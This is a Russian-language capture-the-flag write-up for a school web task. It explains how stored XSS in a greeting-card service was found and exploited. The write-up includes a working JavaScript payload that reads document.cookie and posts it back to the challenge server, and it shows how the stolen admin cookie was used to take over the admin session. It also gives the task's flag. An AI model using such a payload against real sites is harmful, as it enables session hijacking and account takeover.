Web

# Web
## [2.2] Новогоднее поздравление
 > У нас же новый год, верно?
 > Так как в текущих условиях нельзя поздравлять лицом-к-лицу, то мы создали сервис, на котором вы можете отправлять приглашения друг-другу!

 > Говорят, что у админа есть особое поздравление для вас... Только он его отдавать почему-то не хочет. Но с радостью открывает ссылки в поздравлениях для него. 84.201.172.73:12004

 > Кто решит данный таск получит отдельную 5+ с большим коэффициентом. Hint1: Вам нужно получить куку админа. Для этого вспомните все, что мы проходили и пересмотрите задачи на requests, один из сайтов вам поможет.

Категория: `web` `not_easy`

### Решение
Регистрируюсь на сайте. 

Пришло в голову протестировать систему приема сообщений на уязвимость XSS. Закинул тестовый payload себе в поздравления:

![01ff57a79a0dcad0b6ea900974bdbff2.png](89bc584a63294eefbef21d3c22d51a36.png)

Если на сайте присутствует уязвимость XSS до мой код выполнится и слово "Получилось" будет красным.

![c1952e4ca063fe04ea7147ae74a0c93b.png](14317a9fc19b49a5a8edab2af2292bd6.png)

Попробую составить код на javascript, который сворует куки чужого браузера (`document.cookies`) и с помощью POST запроса отправит мне в поздравления.

Смотрю на запрос отправки сообщения:

![d0e63b832fa8e679ec6de31fb215b334.png](5b33abac634641848e5c3a9a3e97a504.png)

Поле `username` используется для указания ника собеседника, `congr` для указания самого сообщения.

Получившийся XSS код:

```html
<script>var req = new XMLHttpRequest();req.open("POST", "http://84.201.172.73:12004/congr");req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");req.send("username=test&congr="+encodeURIComponent(document.cookie));</script>
```
Тестирую на себе:

![58520ebb793637c0a39e027f02d1a2b8.png](d810864aa54e4c43979bd3ab4fe6d417.png)

![8ee3a460d9ed68237c0bbb55d90f535e.png](88c87f3349654e118c522e5305989691.png)

Работает!

Отправляю админу:

![6dedd39a049aa10e189e4f572d42f2ed.png](dbc705998b694f348cdbb4776aca0f31.png)

![7fcc9160723edca6e84af57a1e588130.png](0b322daedf7342e1b894ef1d33ecf9bd.png)

Получил куки, подставил.

![417f816693ec6c84653fe17531d90468.png](8ecd36eb852640cfa1864f04bc97d4af.png)

![f07417e63fc409536b22212ef69b17b0.png](bcbd3ac5a43446a4a66bfa2820e2cc1a.png)

`Имя: admin Админ: True` - Я под админом.

Здесь веб за 50.

![14f19ae3737ef24942ed5606b40938a2.png](0aaead849121443f9e8fb2ce466acbc6.png)

Все.
### Флаг
`mshp{n3w_y34r_styl3d_xx5_5xpl0iting_i5_s0_funny}`

